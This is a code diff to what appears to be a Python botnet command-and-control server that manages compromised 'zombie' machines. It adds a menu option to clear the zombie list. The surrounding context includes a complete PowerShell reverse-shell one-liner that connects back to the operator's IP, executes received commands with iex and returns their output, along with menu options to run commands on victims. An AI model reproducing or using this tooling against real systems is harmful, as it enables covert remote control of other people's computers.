@@ -48,6 +48,9 @@ def spawn_shell(socket):
 	socket.send(b'\nPress ctrl+c to exit the shell. Dont enter exit or zombie will die!!!\n')
 	z.command_cue.append("$client = New-Object System.Net.Sockets.TCPClient(\\\""+external_ip+"\\\","+port+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\\"PS \\\" + (pwd).Path + \\\"> \\\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
 
+def empty_zombie_list(socket):
+	listener.zombies = []
+	list_zombies(socket)
 
 def close_socket(socket):
 	socket.close()
@@ -61,6 +64,8 @@ def print_menu(socket):
 0) List zombies
 1) Execute command
 2) Spawn shell
+
+88) Empty zombie list
 
 99) Exit
 
@@ -100,6 +105,8 @@ class ClientThread(threading.Thread):
 				execute_command(self.clientsocket)
 			elif choice == 2:
 				spawn_shell(self.clientsocket)
+			elif choice == 88:
+				empty_zombie_list(self.clientsocket)
 			# Close socket
 			elif choice == 99:
 				# Exit
